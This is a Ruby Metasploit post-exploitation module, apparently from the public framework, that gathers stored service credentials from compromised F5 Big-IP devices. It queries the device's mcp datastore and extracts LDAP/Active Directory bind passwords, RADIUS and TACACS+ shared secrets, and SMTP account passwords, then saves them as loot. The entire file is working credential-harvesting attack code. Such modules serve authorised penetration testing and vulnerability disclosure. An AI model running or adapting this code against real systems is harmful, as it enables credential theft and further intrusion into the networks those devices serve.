##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Post::Linux::F5Mcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'F5 Big-IP Gather Passwords',
        'Description' => %q{
          This module gathers passwords from F5's mcp datastore, which is accessed
          via /var/run/mcp on F5 Big-IP (and similar) devices.

          To develop this module, I used tooling I wrote to dump *everything* from
          mcp, then used regexes to look through ~400,000 lines of output for
          anything that might store passwords.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Ron Bowes'],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          ['URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool'], # Original PoC
          ['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],
          ['URL', 'https://support.f5.com/csp/article/K97843387'],
        ],
        'DisclosureDate' => '2022-11-16',
        'Targets' => [[ 'Auto', {} ]],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def run
    results = []

    vprint_status('Trying to fetch LDAP / Active Directory configuration')
    ldap_config = mcp_simple_query('auth_ldap_config')
    if ldap_config.empty?
      print_status('No LDAP / Active Directory password found')
    else
      ldap_config.each do |config|
        if config['auth_ldap_config_bind_pw']
          results << "LDAP: #{config['auth_ldap_config_bind_dn']} / #{config['auth_ldap_config_bind_pw']} (server(s): #{config['auth_ldap_config_servers'].join(', ')})"
        end
      end
    end

    vprint_status('Trying to fetch Radius configuration')
    radius_config = mcp_simple_query('radius_server')
    if radius_config.empty?
      print_status('No Radius password found')
    else
      radius_config.each do |config|
        if config['radius_server_secret']
          results << "Radius secret: #{config['radius_server_secret']} (server: #{config['radius_server_server']})"
        end
      end
    end

    vprint_status('Trying to fetch TACACS+ configuration')
    tacacs_config = mcp_simple_query('auth_tacacs_config')
    if tacacs_config.empty?
      print_status('No TACACS+ password found')
    else
      tacacs_config.each do |config|
        if config['auth_tacacs_config_secret']
          results << "TACACS+ secret: #{config['auth_tacacs_config_secret']} (server(s): #{config['auth_tacacs_config_servers'].join(', ')})"
        end
      end
    end

    vprint_status('Trying to fetch SMTP configuration')
    smtp_config = mcp_simple_query('smtp_config')
    if smtp_config.empty?
      print_status('No SMTP password found')
    else
      smtp_config.each do |config|
        if config['smtp_config_username']
          results << "SMTP account: #{config['smtp_config_username']} / #{config['smtp_config_password']} (server(s): #{config['smtp_config_smtp_server_address']}:#{config['smtp_config_smtp_server_port']})"
        end
      end
    end

    if results.empty?
      print_warning('No service passwords found')
    else
      if datastore['VERBOSE']
        results.each { |r| print_good(r) }
      end

      print_good("Passwords stored in #{store_loot('f5.service.passwords', 'text/plain', session, results.join("\n"), nil, 'F5 Service Passwords')}")
    end
  end
end
